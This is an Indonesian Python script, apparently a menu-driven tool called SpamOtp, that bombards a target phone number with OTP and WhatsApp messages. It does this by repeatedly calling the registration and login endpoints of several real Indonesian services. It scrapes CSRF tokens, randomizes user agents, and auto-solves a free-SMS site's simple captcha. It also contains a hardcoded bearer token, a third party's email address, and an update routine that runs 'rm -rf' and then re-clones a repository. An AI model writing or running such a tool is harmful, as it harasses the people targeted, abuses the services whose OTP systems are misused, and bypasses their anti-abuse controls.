# author : Avin Ndeso

import os,json,shutil,requests,re,sys,time
from bs4 import BeautifulSoup as sup
from fake_useragent import UserAgent

if sys.platform in ['win32','nt']:
	W = ''
	R = ''
	G = ''
	Y = ''
	B = ''
	L = ''
	C = ''
	_W = ''
	_R = ''
	_G = ''
	_Y = ''
	_B = ''
	_L = ''
	_C = ''
else:
	W = '\033[0m'
	R = '\033[91m'
	G = '\033[92m'
	Y = '\033[93m'
	B = '\033[94m'
	L = '\033[95m'
	C = '\033[96m'
	_W = '\033[1;97m'
	_R = '\033[1;91m'
	_G = '\033[1;92m'
	_Y = '\033[1;93m'
	_B = '\033[1;94m'
	_L = '\033[1;95m'
	_C = '\033[1;96m'
try:
	os.mkdir('__pycache__')
except:
	pass
try:
	shutil.rmtree('__pycache__')
except:
	pass
def Sukses(nomor,u):
	print (f'{W}[{G}{u}{W}] Sukses Terkirim Ke {C}{nomor}{W}')

class Spammer:
	def __init__(self):
		self.c = requests.Session()
	def bakmi(self,nomor,jumlah):
		head = {'Host': 'nabill.me','accept':'*/*','x-requested-with':'XMLHttpRequest','user-agent':UserAgent().random ,'content-type':'application/x-www-form-urlencoded; charset=UTF-8','origin':'https://nabill.me','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','referer':'https://nabill.me/Bakmi_Otp','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
		for i in range(20,int(jumlah)+20):
			r = requests.post('https://nabill.me/Tools/Prank-Tools/Bakmi/api.php',headers=head,data=
			{'nomor':nomor,'jumlah':'20'})
			if 'Terkirim' in str(r.text):
				Sukses(nomor,i)
	def CodaTsel(self,nomor,jumlah):
		head = {'Host':'nabill.me','accept':'*/*','x-requested-with':'XMLHttpRequest','user-agent':UserAgent().random,'content-type':'application/x-www-form-urlencoded; charset=UTF-8','origin':'https://nabill.me','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','referer':'https://nabill.me/Codashop_Spam_Telkomsel','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
		for i in range(20,int(jumlah)+20):
			r = requests.post('https://nabill.me/Tools/Prank-Tools/Codashop-Spam-Telkomsel/api.php',headers=head,data=
			{'nomor':nomor,'jumlah':'20'})
			if 'Terkirim' in str(r.text):
				Sukses(nomor,i)
	def mypoin(self,nomor,jumlah):
		def get_cookies():
			r = requests.get('https://mypoin.id/register/validate-phone-number')
			kue = r.headers['Set-Cookie']
			cfduid = re.findall("(?<=__cfduid=)(.*);",str(kue))[0]
			csrf = re.findall("(?<=csrftoken=)(.*?);",str(kue))[0].replace(';','')
			html = sup(r.content,features='html.parser')
			token = html.find('input',{"name":"csrfmiddlewaretoken"})['value']
			return {'cfduid':cfduid,'csrf':csrf,'token':token}
		e = 0
		for i in range(int(jumlah)):
			ata = get_cookies()
			head = {"Host":"mypoin.id","Connection":"keep-alive","Origin":"https://mypoin.id","X-Requested-With":"XMLHttpRequest","Save-Data":"on","User-Agent":"Mozilla/5.0","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Referer":"https://mypoin.id/register/validate-phone-number","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6","Cookie":"__cfduid="+str(ata['cfduid'])+"; csrftoken="+str(ata['csrf'])+"; _ga=GA1.2.138906189.1579843059; _gid=GA1.2.761915441.1579843059"}
			r = requests.post('https://mypoin.id/register/request-otp',headers=head,data=
			{'phone':nomor,
			'csrfmiddlewaretoken':ata['token']}).json()
			if 'ok' in str(r):
				e+=1
				Sukses(nomor,e)
			else:
				for x in range(10):
					print (f"\r[*] Sleep {10-(x+1)} .....",end='')
					time.sleep(0)
				print()
			#print (r)
	def Kioson(self,nomor,jumlah):
		head = {'Content-Type':'application/json','Host':'kiosondev.app.narindo.com','Connection':'Keep-Alive','Accept-Encoding':'gzip','User-Agent':'okhttp/3.8.0'}
		for i in range(20,int(jumlah)+20):
			r = requests.post('https://kiosondev.app.narindo.com/api/v1/otp',headers=head,json=
			{'appType':'KIOSON','msisdn':nomor}).json()
			if 'success' in r['msg']:
				Sukses(nomor,i)
			time.sleep(1)
	def alodok(self,nomor,jumlah):
		for i in range(20,int(jumlah)+20):
			r = requests.get('https://www.alodokter.com/login-alodokter')
			parser = sup(r.text,features='html.parser')
			token = parser.find('meta',{'name':'csrf-token'})['content']
			head = {'accept':'application/json','x-csrf-token':token,'user-agent':'Mozilla/5.0 (Linux; Android 9; RMX1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36','content-type':'application/json','origin':'https://www.alodokter.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','referer':'https://www.alodokter.com/login-alodokter','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			req = requests.post('https://www.alodokter.com/login-with-phone-number',headers=head,json=
			{'user':{'phone':nomor}}).json()
			#print (req.text)
			if 'success' in req['status']:
				Sukses(nomor,i)
				time.sleep(1)
	def klikdok(self,nomor,jumlah):
		for i in range(20,int(jumlah)+20):
			html = sup(self.c.get('https://m.klikdokter.com/users/create').content,features='html.parser')
			token = html.find('input',{'name':'_token'})['value']
			head={'Connection': 'keep-alive','Cache-Control': 'max-age=0','Origin': 'https://m.klikdokter.com','Upgrade-Insecure-Requests': '1','Content-Type': 'application/x-www-form-urlencoded','User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','Referer': 'https://m.klikdokter.com/users/create?back-to='}
			r = self.c.post('https://m.klikdokter.com/users/check',headers=head,data=
			{'_token':token,'full_name':'RidhoGaming','email':'syahbanaridho@gmail.com','phone':nomor,'back-to':'','submit':'Daftar'})
			if '/auth?user=' in str(r.url):
				Sukses(nomor,i)
				time.sleep(1)
	def Payu(self,nomor,pesan):
		head = {"Host":"sms.payuterus.biz","Connection":"keep-alive","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Linux; Android 9; RMX1911 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","Accept-Encoding":"gzip, deflate","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","X-Requested-With":"com.smsGratisSeluruhIndonesia64"}
		def GetAll():
			r = requests.get('http://sms.payuterus.biz/alpha/',headers=head)
			cfduid = re.findall("(?<=__cfduid=)(.*?);",str(r.headers['Set-Cookie']))[0]
			sesi = re.findall("(?<=PHPSESSID=)(.*?);",str(r.headers['Set-Cookie']))[0]
			o = []
			html = sup(r.content,features='html.parser')
			for hasil in html.find_all('span'):
				o.append(hasil.text)
			capt = int(str(o)[2])+int(str(o)[6])
			key = html.find('input',{'name':'key'})['value']
			return {'cfduid':cfduid,'sesi':sesi,'capt':capt,'key':key}
		mam = GetAll()
		heder = {
	"Host":"sms.payuterus.biz",
	"Connection": "keep-alive",
	"Origin": "http://sms.payuterus.biz",
	"Upgrade-Insecure-Requests": "1",
	"Content-Type": "application/x-www-form-urlencoded",
	"User-Agent": "Mozilla/5.0 (Linux; Android 9; RMX1911 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
	"Referer": "http://sms.payuterus.biz/alpha/",
	"Accept-Encoding": "gzip, deflate",
	"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
	"Cookie":"__cfduid="+str(mam['cfduid'])+"; PHPSESSID="+str(mam['sesi'])+"; _ga=GA1.2.655696824.1580558326; _gid=GA1.2.978964674.1580558326; __gads=ID=2dc1d11dac483254:T=1580558326:S=ALNI_Mb1RnVJ0hJfGQdEjsud9zl_AhDa-Q; _gat=1",
	"X-Requested-With":"com.smsGratisSeluruhIndonesia64"
}
		req = requests.post('http://sms.payuterus.biz/alpha/send.php',headers=heder,data=
			{'nohp':nomor,
			'pesan':pesan,
			'captcha':mam['capt'],
			'key':mam['key']})
		#print (req.text)
		if 'SMS Gratis Telah Dikirim' in str(req.text):
			print (f'[{G}✓{W}] Sukses Terkirim Ke {C}{nomor}{W}')
		else:
			print (f'{R}[!]{W} Gagal Terkirim Ke {C}{nomor}{W}')
	def RupaRupa(self,nomor):
		head = {'Host':'wapi.ruparupa.com','authorization':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiMDFmMTYyNTEtMzM0Ni00MmRiLWI0MDItODMxY2FmNjA2ZjljIiwiaWF0IjoxNTgxMDA3NTg0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.vJ7uUcys74Ju8CnM692kQBxUgJMKfGd2rIyGivOnvxM','content-type':'application/json','x-company-name':'odi','accept':'application/json','user-agent':'Mozilla/5.0 (Linux; Android 9; RMX1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36','user-platform':'mobile','x-frontend-type':'mobile','origin':'https://m.ruparupa.com','sec-fetch-site':'same-site','sec-fetch-mode':'cors','referer':'https://m.ruparupa.com/verification?page=otp-choices','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
		i = 0
		while True:
			r = requests.post('https://wapi.ruparupa.com/auth/generate-otp',headers=head,json={
				"phone":nomor,
				"action":"register",
				"channel":"chat",
				"email":"",
				"customer_id":"0",
				"is_resend":'0'
			})
			js = json.loads(r.text)
			if 'success' in js['message'] :
				i+=1
				Sukses(nomor,i)
				time.sleep(1)
				exit(f"{W}[{B}*{W}] {R}"+js['message']+W)
			else:
				exit(js)

#Spammer().Payu('083113226393','haha')
def update():
	r = requests.get('http://auxcrewtbdrpg.com/update.txt')
	if '1.3' in str(r.text):
		return r.text.replace('\\033','\033').replace('\\n','\n')
	else:
		return ''
while True:
	os.system('clear')
	try:
		print (f'''
    {_R}[ {Y}Author {W}:{C} AvinNdeso {_R}]
    {_R}[ {Y}Github {W}: Maaf bro! {_R}]
    {_R}[ {Y}Team   {W}: * {_R}]
    {_R}[ {Y}Version {W}: 1.2 {_R}]{W}
------------------------------------------------
{update()}
 {G}01.{W} Spam Otp MyPoint
 {G}02.{W} Spam Otp Kioson
 {G}03.{W} Spam Otp BakmiGm
 {G}04.{W} Spam Otp CodaShop Tsel
 {G}05.{W} Spam Otp Alodokter
 {G}06.{W} Spam Otp KlikDokter
 {G}07.{W} Spam WA RupaRupa
 {G}08.{W} SMS Gratis Payu
 {G}99.{W} Update Tools
''')
		pil = input(f'{L}[>]{W} Choice : ')
		if pil == '1' or pil == '01':
			nomor = input(f'{C}[+]{W} No Hp : ')
			if nomor == '':
				exit(f'{R}[!]{W} Jangan Kosong Gan!')
			jumlah = input(f'{C}[+]{W} Jumlah : ')
			if jumlah == '':
				exit(f'{R}[!]{W} Jangan Kosong Gan!')
			print()
			Spammer().mypoin(nomor,jumlah)
		elif pil == '2' or pil == '02':
			nomor = input(f'{C}[+]{W} No Hp : ')
			if nomor == '':
				exit(f'{R}[!]{W} Jangan Kosong Gan!')
			jumlah = input(f'{C}[+]{W} Jumlah : ')
			if jumlah == '':
				exit(f'{R}[!]{W} Jangan Kosong Gan!')
			print()
			Spammer().Kioson(nomor,jumlah)
		elif pil == '3' or pil == '03':
			nomor = input(f'{C}[+]{W} No Hp (62) : ')
			if '08' in nomor[0:2]:
				exit(f'{R}[!]{W} Pakai 62 Gan!')
			if nomor == '':
				exit(f'{R}[!]{W} Jangan Kosong Gan!')
			jumlah = input(f'{C}[+]{W} Jumlah : ')
			if jumlah == '':
				exit(f'{R}[!]{W} Jangan Kosong Gan!')
			print()
			Spammer().bakmi(nomor,jumlah)
		elif pil == '4' or pil == '04':
			nomor = input(f'{C}[+]{W} No Hp : ')
			if nomor == '':
				exit(f'{R}[!]{W} Jangan Kosong Gan!')
			jumlah = input(f'{C}[+]{W} Jumlah : ')
			if jumlah == '':
				exit(f'{R}[!]{W} Jangan Kosong Gan!')
			print()
			Spammer().CodaTsel(nomor,jumlah)
		elif pil == '5' or pil == '05':
			nomor = input(f'{C}[+]{W} No Hp : ')
			if nomor == '':
				exit(f'{R}[!]{W} Jangan Kosong Gan!')
			jumlah = input(f'{C}[+]{W} Jumlah : ')
			if jumlah == '':
				exit(f'{R}[!]{W} Jangan Kosong Gan!')
			print()
			Spammer().alodok(nomor,jumlah)
		elif pil == '6' or pil == '06':
			nomor = input(f'{C}[+]{W} No Hp : ')
			if nomor == '':
				exit(f'{R}[!]{W} Jangan Kosong Gan!')
			jumlah = input(f'{C}[+]{W} Jumlah : ')
			if jumlah == '':
				exit(f'{R}[!]{W} Jangan Kosong Gan!')
			print()
			Spammer().klikdok(nomor,jumlah)
		elif pil == '7' or pil == '07':
			nomor = input(f'{C}[+]{W} No Hp : ')
			if nomor == '':
				exit(f'{R}[!]{W} Jangan Kosong Gan!')
			print()
			Spammer().RupaRupa(nomor)
		elif pil == '8' or pil == '08':
			nomor = input(f'{C}[+]{W} No Hp : ')
			if nomor == '':
				exit(f'{R}[!]{W} Jangan Kosong Gan!')
			print (f'{Y}[!]{W} Type <n> for new line')
			pesan = input(f'{C}[+]{W} text : ')
			if len(pesan) < 7:
				exit(f'{R}[!]{W} Pesan Minimal 7 Karakter')
			Spammer().Payu(nomor,pesan)
		elif pil == '99':
			if '1.3' in str(update()):
				os.system('cd ..;rm -rf SpamOtp;git clone https://github.com/ridhoNoob/SpamOtp;cd SpamOtp')
				exit(f'{W}[{B}*{W}] {G}Done.Silahkan Mulai Ulang\n{W}')
			else:
				exit(f'{W}[{B}*{W}] Already To Update')
		else:
			exit(f'{R}[!]{W} Liat Menu Dong! ')
		tanya = input('\n[?] Coba Lagi (y/n) : ')
		if tanya.lower() == 'n':
			exit()
	except KeyboardInterrupt:
			exit()
	except Exception as J:
		exit(J)
